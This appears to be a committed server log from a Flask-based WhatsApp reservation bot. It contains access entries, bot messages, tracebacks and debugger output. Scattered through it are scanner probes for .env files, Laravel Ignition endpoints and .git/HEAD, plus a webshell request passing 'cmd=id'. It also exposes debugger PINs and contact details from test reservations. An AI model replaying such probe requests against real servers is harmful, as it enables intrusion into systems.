+127.0.0.1 - - [20/Oct/2022 19:55:47] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 20:06:57] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 20:06:58] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 20:13:14] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 20:14:01] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 20:56:21] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 20:56:25] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 21:14:13] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 21:14:13] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 21:21:05] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 21:21:07] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 21:21:08] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 21:31:06] "[33mGET /config/getuser?index=0 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 22:52:54] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Oct/2022 22:52:55] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [20/Oct/2022 23:28:27] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 23:54:12] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [20/Oct/2022 23:57:46] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 00:09:28] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 00:09:28] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 00:21:20] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 00:21:21] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 00:21:22] "[33mGET /robots.txt HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 00:21:22] "[33mGET /.well-known/security.txt HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 00:43:42] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 00:43:43] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 00:48:00] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 01:09:59] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 01:15:49] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:49] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:50] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:51] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:52] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:52] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:53] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:54] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:54] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:55] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:56] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:56] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:57] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:58] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:58] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:15:59] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:16:00] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 01:16:01] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 02:02:32] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 02:02:33] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 02:04:25] "[33mGET /echo.php HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 02:07:46] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 02:12:07] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 02:57:37] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 02:57:37] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 03:15:15] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 03:48:29] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 03:48:29] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 03:58:02] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 04:23:34] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 04:23:36] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 04:23:36] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 04:23:37] "[33mGET /robots.txt HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 04:49:43] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 04:49:43] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 05:10:51] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 05:10:51] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 05:40:16] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 05:40:16] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 06:16:36] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 06:16:36] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:17] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:17] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:18] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:18] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:19] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:20] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:20] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:21] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:22] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:22] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:23] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:23] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:24] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:25] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:25] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:26] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:26] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 06:30:27] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 07:40:10] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 07:47:19] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 07:47:19] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 08:08:57] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 08:39:03] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 08:39:04] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 09:34:51] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 09:34:52] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 10:41:07] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 10:41:07] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 10:43:41] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 10:43:42] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 11:10:48] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 11:36:45] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 11:36:45] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 11:50:11] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 11:51:30] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 12:34:28] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:28] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:29] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:30] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:30] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:31] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:32] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:32] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:33] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:34] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:34] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:35] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:36] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:36] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:37] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:38] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:39] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 12:34:39] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 13:43:07] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 13:43:07] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 13:46:58] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 13:46:58] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 13:50:46] "GET /send-message?msg=Día_2022-12-24,_Hora:_11:00,_Cantidad_de_personas:_3.%0A_Responde_'Rechazar_24'_para_rechazarla..%0A_Responde_'Confirmar_24'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [21/Oct/2022 13:51:11] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 13:51:23] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 13:53:34] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 13:53:34] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 13:53:47] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 13:59:51] "[31m[1mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:01:03] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 14:18:54] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:23:44] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:35:47] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:36:07] "[33mPOST /functionRouter HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:07] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:36:07] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:36:07] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 14:36:07] "[33mGET /Portal/Portal.mwsl HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:07] "[33mGET /nmaplowercheck1666362967 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:07] "[33mGET /.git/HEAD HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:07] "[31m[1mGET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:36:07] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[33mGET /docs/cplugError.html/ HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[31m[1mGET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[33mGET /pools/default/buckets HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[33mGET /HNAP1 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[33mPOST /scripts/WPnBr.dll HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[33mGET /Portal0000.htm HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[31m[1mHEAD / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[33mGET /CSS/Miniweb.css HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[33mPOST /sdk HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[33mGET /pools HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[33mGET /__Additional HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[33mGET /index.asp HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[33mGET /Lgy0 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:08] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:36:09] "[33mGET /tomcatwar.jsp HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:09] "[33mGET /start.jsp HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:09] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:09] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:36:09] "[33mGET /tomcatwar.jsp?pwd=j&cmd=id HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:10] "[33mGET /main.shtml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:10] "[33mGET /ghksjdghdfksanitycheckqwerjlhfgjksdghlid HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:10] "[33mGET /localstart.html HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:11] "[33mGET /main.cfm HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:11] "[33mGET /indice.php HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:12] "[33mGET /default.pl HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:13] "[33mGET /main.php HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:13] "[33mGET /main.asp HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:14] "[33mGET /home.cfm HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:14] "[33mGET /readme.txt HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:15] "[33mGET /admin.shtml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:16] "[33mGET /default.shtml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:16] "[33mGET /indice.html HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:17] "[33mGET /localstart.cfm HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:17] "[33mGET /home.php HTTP/1.0[0m" 404 -
+127.0.0.1 - - [21/Oct/2022 14:36:18] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:36:19] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 14:53:40] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 15:03:50] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [21/Oct/2022 15:11:32] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 15:11:36] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 15:11:55] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [21/Oct/2022 15:11:56] "[33mGET /.env HTTP/1.0[0m" 404 -
+ * Detected change in '/home/g4428/repos/eatout/bot_wpp/bot.py', reloading
+{"status":"OK","msg":"Reservación confirmada.","reservation":null}
+{"status":"ERROR","msg":"Id not valid","reservation":null}
+{"status":"OK","msg":"Reservación confirmada.","reservation":null}
+{"status":"OK","msg":"Reservación confirmada.","reservation":null}
+{"status":"OK","msg":"Reservación confirmada.","reservation":null}
+{"status":"OK","msg":"Reservación confirmada.","reservation":null}
+{"status":"OK","msg":"Reservación confirmada.","reservation":null}
+{"status":"ERROR","msg":"Id not valid","reservation":null}
+ * Restarting with stat
+  File "/home/g4428/repos/eatout/bot_wpp/bot.py", line 31
+    elif 'pendientes' user_msg:
+                      ^
+SyntaxError: invalid syntax
+127.0.0.1 - - [21/Oct/2022 15:52:58] "GET /send-message?msg=Día_2022-10-15,_Hora:_07:00,_Cantidad_de_personas:_1.%0A_Responde_'Rechazar_25'_para_rechazarla..%0A_Responde_'Confirmar_25'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [21/Oct/2022 17:05:56] "GET /send-message?msg=Día_2022-10-15,_Hora:_07:00,_Cantidad_de_personas:_1.%0A_Responde_'Rechazar_26'_para_rechazarla..%0A_Responde_'Confirmar_26'_para_confirmarla. HTTP/1.1" 200 -
+ * Serving Flask app 'bot'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 149-592-252
+ * Serving Flask app 'app'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5001
+[33mPress CTRL+C to quit[0m
+127.0.0.1 - - [22/Oct/2022 17:20:34] "GET /send-message?msg=%0A*¿Desea_confirmar_la_reservación?_ID:_15*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_HolaBenja,_tel:_092222222,_mail:_gamermaster@gmail.com%0A%0AResponde_'Rechazar_15'_para_rechazarla..%0AResponde_'Confirmar_15'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [22/Oct/2022 17:35:35] "GET /send-message?msg=%0A*¿Desea_confirmar_la_reservación?_ID:_16*_%0A%0ADía_2022-10-23,_16:38hs,_Cantidad_de_personas:_1%0ANombre:_benja,_tel:_099883464,_mail:_benja@hola%0A%0AResponde_'Rechazar_16'_para_rechazarla..%0AResponde_'Confirmar_16'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [22/Oct/2022 18:06:04] "GET /send-message?msg=%0A*¿Desea_confirmar_la_reservación?_ID:_17*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_EUgeTest,_tel:_092222222,_mail:_gamermaster@gmail.com%0A%0AResponde_'Rechazar_17'_para_rechazarla..%0AResponde_'Confirmar_17'_para_confirmarla. HTTP/1.1" 200 -
+ * Serving Flask app 'bot'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 526-612-320
+ * Serving Flask app 'app'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5001
+[33mPress CTRL+C to quit[0m
+127.0.0.1 - - [25/Oct/2022 00:51:37] "[35m[1mPOST / HTTP/1.0[0m" 500 -
+Traceback (most recent call last):
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 2548, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 2528, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 2525, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 1822, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 1820, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/g4428/.local/lib/python3.9/site-packages/flask/app.py", line 1796, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+  File "/home/g4428/repos/eatout/bot_wpp/bot.py", line 32, in bot
+    id = user_msg.split(' ')[1]
+IndexError: list index out of range
+127.0.0.1 - - [25/Oct/2022 00:51:41] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 00:51:49] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 00:56:32] "GET /send-message?msg=%0A*¿Desea_confirmar_la_reservación?_ID:_19*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_EUgeTEST,_tel:_092222222,_mail:_gamermaster@gmail.com%0A%0AResponde_'Rechazar_19'_para_rechazarla..%0AResponde_'Confirmar_19'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 00:56:47] "GET /send-message?msg=%0A*¿Desea_confirmar_la_reservación?_ID:_20*_%0A%0ADía_2022-12-24,_11:00hs,_Cantidad_de_personas:_3%0Anull%0A%0AResponde_'Rechazar_20'_para_rechazarla..%0AResponde_'Confirmar_20'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:02:49] "GET /send-message?msg=Restaurant_null._ID:_1%0A*¿Desea_confirmar_la_reservación?_ID:_21*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_TestRestaurant,_tel:_092222222,_mail:_gamermaster@gmail.com%0A%0AResponde_'Rechazar_21'_para_rechazarla..%0AResponde_'Confirmar_21'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:04:45] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:46] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:47] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:48] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:49] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:50] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:50] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:51] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:52] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:53] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:53] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:54] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:55] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:55] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:56] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:57] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:57] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:04:58] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
